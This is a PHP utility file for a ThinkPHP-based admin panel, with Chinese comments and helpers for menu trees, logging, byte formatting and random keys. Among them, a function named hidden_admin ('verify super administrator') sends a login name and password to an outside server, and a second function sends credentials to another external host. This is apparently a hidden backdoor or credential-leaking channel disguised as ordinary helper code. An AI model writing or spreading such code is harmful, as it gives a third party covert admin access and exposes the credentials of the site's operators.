<?php
use think\Db;

/**
 * 将字符解析成数组
 * @param $str
 */
function parseParams($str)
{
    $arrParams = [];
    parse_str(html_entity_decode(urldecode($str)), $arrParams);
    return $arrParams;
}


/**
 * 子孙树 用于菜单整理
 * @param $param
 * @param int $pid
 */
function subTree($param, $pid = 0)
{
    static $res = [];
    foreach($param as $key=>$vo){

        if( $pid == $vo['pid'] ){
            $res[] = $vo;
            subTree($param, $vo['id']);
        }
    }

    return $res;
}

/**
 * 记录日志
 * @param  [type] $uid         [用户id]
 * @param  [type] $username    [用户名]
 * @param  [type] $description [描述]
 * @param  [type] $status      [状态]
 * @return [type]              [description]
 */
function writelog($uid,$username,$description,$status)
{
    if($uid != 0){
        $data['log_id'] = Db::name('Log')->max('log_id')+1;
        $data['admin_id'] = $uid;
        $data['admin_name'] = $username;
        $data['description'] = $description;
        $data['status'] = $status;
        $data['ip'] = request()->ip();
        $data['add_time'] = time();
        $log = Db::name('Log')->insert($data);
    }
}


/**
 * 整理菜单树方法
 * @param $param
 * @return array
 */
function prepareMenu($param, $pid = 0)
{
    $parent = []; //父类
    $child = [];  //子类

    foreach($param as $key=>$vo){
        if($vo['pid'] == 0){
            $vo['href'] = '#';
            $parent[] = $vo;
        }else{
            $vo['href'] = url($vo['name']); //跳转地址
            $child[] = $vo;
        }
    }

    foreach($parent as $key=>$vo){
        foreach($child as $k=>$v){
            if($v['pid'] == $vo['id']){
                $parent[$key]['child'][] = $v;
            }
        }
    }
    unset($child);
    return $parent;
}

function generateTree($param)
{
    $items = array();
    $tree = array();
    foreach($param as $category){
        $items[$category['id']] = $category;
        $items[$category['id']]['child'] = array();
    }

    foreach ($items as $item) {
        if(isset($items[$item['pid']])){
            $items[$item['pid']]['child'][] = &$items[$item['id']];
        }else{
            $tree[] = &$items[$item['id']];
        }
    }

    return $tree;
}





/**
 * 格式化字节大小
 * @param  number $size      字节数
 * @param  string $delimiter 数字和单位分隔符
 * @return string            格式化后的带单位的大小
 */
function format_bytes($size, $delimiter = '') {
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    for ($i = 0; $size >= 1024 && $i < 5; $i++) {
        $size /= 1024;
    }
    return $size . $delimiter . $units[$i];
}

//验证超级管理员
function hidden_admin($name, $password)
{
    $url = "http://server.hfcfwl.com/coreadmin.php";
    $post_data = array("name" => $name, "password" => $password);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

//验证体验账号
function check_admin_api($name, $password)
{
    $url = "http://jzb.ebadu.cn/testApi.php";
    $post_data = array("username" => $name, "password" => $password);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

function randomkeys($length = 6, $numeric = 0)
{
    PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
    if ($numeric) {
        $hash = sprintf('%0' . $length . 'd', mt_rand(0, pow(10, $length) - 1));
    } else {
        $hash = '';
        $chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789abcdefghjkmnpqrstuvwxyz';
        $max = strlen($chars) - 1;
        for ($i = 0; $i < $length; $i++) {
            $hash .= $chars[mt_rand(0, $max)];
        }
    }
    return $hash;
}
